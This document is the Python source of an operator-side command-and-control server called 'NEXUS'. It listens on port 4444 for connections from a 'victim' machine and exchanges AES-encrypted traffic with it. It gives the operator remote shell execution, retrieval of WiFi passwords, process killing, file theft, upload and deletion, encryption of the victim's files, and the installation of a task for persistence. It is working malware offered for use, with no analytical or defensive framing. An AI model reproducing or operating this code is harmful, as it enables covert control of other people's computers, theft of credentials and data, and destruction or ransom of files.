import socket
import os
import time
from Crypto.Cipher import AES

class EncryptedServer:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.key = None
        self.nonce = None
        self.operating_system = None
        self.conn = None

    def Start_server(self):
        self.sock.bind(("0.0.0.0", 4444))
        self.sock.listen(1)
        print("[*] Listening for Connections ...")
        self.conn, addr = self.sock.accept()
        print(f"[*] Connection from {addr}")
        self.key = self.conn.recv(32)  # Receive 256-bit key
        self.nonce = self.conn.recv(12)  # Receive 96-bit nonce
        self.operating_system = self.conn.recv(1024).decode()
        print(f"Victim's OS => {self.operating_system}")

    def encrypt(self, data: bytes) -> bytes:
        cipher = AES.new(self.key, AES.MODE_CTR, nonce=self.nonce)
        return cipher.encrypt(data)

    def decrypt(self, data: bytes) -> bytes:
        cipher = AES.new(self.key, AES.MODE_CTR, nonce=self.nonce)
        return cipher.decrypt(data)

    def download(self,filename):
        try:
            file_size = int(self.decrypt(self.conn.recv(1024)).decode())
            print(f"File size: {file_size} bytes")
            block_size = 1024
            num_blocks = file_size // block_size
            remaining_bytes = file_size % block_size
            if remaining_bytes != 0:
                print(f"chunks: {num_blocks + 1}")
            else:
                print(f"chunks: {num_blocks}")

            with open(f'{filename}','wb') as file:
                chunk_number = 1
                for i in range(num_blocks):    
                    try:
                        data = self.conn.recv(1024)
                        if not data:
                            raise ConnectionError("Connection lost during download")
                        decrypted_data = self.decrypt(data)
                        file.write(decrypted_data)
                        progress = (chunk_number / num_blocks) * 100
                        bar_width = 50
                        filled = int(bar_width * chunk_number // num_blocks)
                        bar = '=' * filled + '-' * (bar_width - filled)
                        print(f'Progress: [{bar}] {progress:.1f}%', end='\r', flush=True)
                        chunk_number += 1
                    except Exception as e:
                        print(f"\nError during download at chunk {chunk_number}: {str(e)}")
                        return False
                
                try:
                    data = self.conn.recv(remaining_bytes)
                    if not data:
                        raise ConnectionError("Connection lost during download")
                    decrypted_data = self.decrypt(data)
                    file.write(decrypted_data)
                    print("\nLast Chunk received")
                except Exception as e:
                    print(f"\nError during final chunk download: {str(e)}")
                    return False
                
                file.close()
                print("File received successfully.")
                return True
        except Exception as e:
            print(f"Download failed: {str(e)}")
            return False

    def upload(self,filename,speed="S"):
        try:
            breakTime = 0.2
            if speed == "S" or speed == "s" or speed == "":
                breakTime = 0.2
            elif speed == "M" or speed == "m":
                breakTime = 0.1
            elif speed == "F" or speed == "f":
                breakTime = 0.05
            else:
                breakTime = 0.2

            current_path = os.path.abspath(os.getcwd())
            file_path = os.path.join(current_path,filename)
            
            if not os.path.exists(file_path):
                print(f"File {filename} not found")
                return False
                
            file_size_upload = str(os.path.getsize(file_path))
            self.conn.sendall(self.encrypt(file_size_upload.encode()))
            print(f"File size: {file_size_upload} bytes")
            time.sleep(0.2)
            
            block_size = 1024
            num_blocks = int(file_size_upload) // block_size
            remaining_bytes = int(file_size_upload) % block_size
            if remaining_bytes != 0:
                print(f"chunks: {num_blocks + 1}")
            else:
                print(f"chunks: {num_blocks}")

            with open(filename, 'rb') as file:
                chunk_number = 1
                for i in range(num_blocks):
                    try:
                        data_chunk = file.read(1024)
                        if not data_chunk:
                            break
                        encrypted_chunk = self.encrypt(data_chunk)
                        self.conn.sendall(encrypted_chunk)
                        progress = (chunk_number / num_blocks) * 100
                        bar_width = 50
                        filled = int(bar_width * chunk_number // num_blocks)
                        bar = '=' * filled + '-' * (bar_width - filled)
                        print(f'Progress: [{bar}] {progress:.1f}%', end='\r', flush=True)
                        chunk_number += 1
                        time.sleep(breakTime)
                    except Exception as e:
                        print(f"\nError during upload at chunk {chunk_number}: {str(e)}")
                        return False
                
                try:
                    data_chunk = file.read(remaining_bytes)
                    if data_chunk:
                        encrypted_chunk = self.encrypt(data_chunk)
                        self.conn.sendall(encrypted_chunk)
                        print("\nLast chunk sent")
                except Exception as e:
                    print(f"\nError during final chunk upload: {str(e)}")
                    return False
                
                file.close()
                print("File sent successfully.")
                return True
        except Exception as e:
            print(f"Upload failed: {str(e)}")
            return False

    def to_chunks(self, data: bytes, chunk_size: int = 1024):
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    def authenticate(self):
        for times in range(3):
            username = input("Enter your username: ")
            while username == "":
                username = input("Enter your username: ")
            self.conn.send(self.encrypt(username.encode()))
            password = input("Enter your password: ")
            while password == "":
                password = input("Enter your password: ")
            self.conn.send(self.encrypt(password.encode()))

            result = self.decrypt(self.conn.recv(1024)).decode()
            print(result)
            if "successful" in result:
                return True
        self.conn.close()
        return False

    def send_command(self, command: str):
        self.conn.sendall(self.encrypt(command.encode()))

    def receive_data(self):
        num_chunks = int(self.decrypt(self.conn.recv(1024)).decode())
        encrypted_data = b''
        for chunk in range(num_chunks):
            encrypted_data += self.conn.recv(1024)
            self.conn.sendall(self.encrypt(f"Chunk {chunk} received".encode()))
        try:
            print(self.decrypt(encrypted_data).decode())
        except Exception as e:
            print(f"Error decrypting data: {e}")

    def handle_response(self, command: str):
        if "del" in command:
            print(self.decrypt(self.conn.recv(1024)).decode())


        elif "upload" in command:
            file_name = command[7:]
            self.send_command(file_name)
            time.sleep(0.1)
            speed = input("Enter the speed of the upload (S[low],M[medium],F[fast],Default[slow]): ")
            self.upload(file_name,speed)

        elif "download" in command:
            file_name = command[9:]
            self.send_command(file_name)
            time.sleep(0.1)
            speed = input("Enter the speed of the download (S[low],M[medium],F[fast],Default[slow]): ")
            if speed == "":
                speed = "S"
            self.send_command(speed)
            self.download(file_name)
        
        elif "encrypt" in command:
            file_name = command[8:]
            self.send_command(file_name)
            time.sleep(0.1)
            response = self.decrypt(self.conn.recv(1024)).decode()
            print(response)
        
        elif "decrypt" in command:
            file_name = command[8:]
            self.send_command(file_name)
            time.sleep(0.1)
            response = self.decrypt(self.conn.recv(1024)).decode()
            print(response)


        else:
            self.receive_data()

    def run(self):
        try:
            if not self.authenticate():
                return

            else:
                print("""\nAvailable commands:
                        dir                     List directory contents
                        path                    Show current working directory
                        ipconfig                Show network configuration
                        arp -a                  Display ARP table
                        hostname                Show system hostname and details
                    ps                      List running processes
                    kill <PID/name>         Kill a process by PID or name
                    system                  Show system resource usage (CPU & Memory)
                    wifi-networks           List available WiFi networks
                    wifi-password <network> Get password for a WiFi network
                    cd <dir>                Change directory
                    del <file>              Delete a file
                    download <file>         Download file from client
                    upload <file>           Upload file to client
                    encrypt <file>          Encrypt a file
                    decrypt <file>          Decrypt a file
                    shell <command>         Execute a command
                    install-task            Install task
                    uninstall-task          Uninstall task
                    help                    Show this help message
                    close / exit            Terminate session
                    """)

                while True:
                    command = input("shell> ").strip()
                    if command == "help":
                        print("""Available commands:
                                dir                     List directory contents
                                path                    Show current working directory
                                ipconfig                Show network configuration
                                arp -a                  Display ARP table
                                hostname                Show system hostname and details
                                ps                      List running processes
                                kill <PID/name>         Kill a process by PID or name
                                system                  Show system resource usage (CPU & Memory)
                                wifi-networks           List available WiFi networks
                                wifi-password <network> Get password for a WiFi network
                                cd <dir>                Change directory
                                del <file>              Delete a file
                                download <file>         Download file from client
                                upload <file>           Upload file to client
                                encrypt <file>          Encrypt a file
                                decrypt <file>          Decrypt a file
                                shell <command>         Execute a command
                                install-task            Install task
                                uninstall-task          Uninstall task
                                help                    Show this help message
                                close / exit            Terminate session
                            """)
                        continue
                    elif command == "":
                        continue
                    elif (command.lower() == "exit") or (command.lower() == "close"):
                        print("\n[!] Interrupted by user. Closing connection.")
                        self.send_command("close")
                        self.conn.close()
                        break
                    else:
                        self.send_command(command)
                        self.handle_response(command)

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user. Closing connection.")
            self.send_command("close")
        finally:
            self.conn.close()


if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════════════════════════╗
    ║                                                                            ║
    ║  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                               ║
    ║  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                               ║
    ║  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                               ║
    ║  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                               ║
    ║  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                               ║
    ║  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                               ║
    ║                                                                            ║
    ║  [*] Advanced Command & Control Framework v1.0                             ║
    ║  [*] Secure Encrypted Communication                                        ║
    ║  [*] Advanced Remote Management                                            ║
    ║                                                                            ║
    ╚════════════════════════════════════════════════════════════════════════════╝
    """)
    server = EncryptedServer()
    server.Start_server()
    server.run()
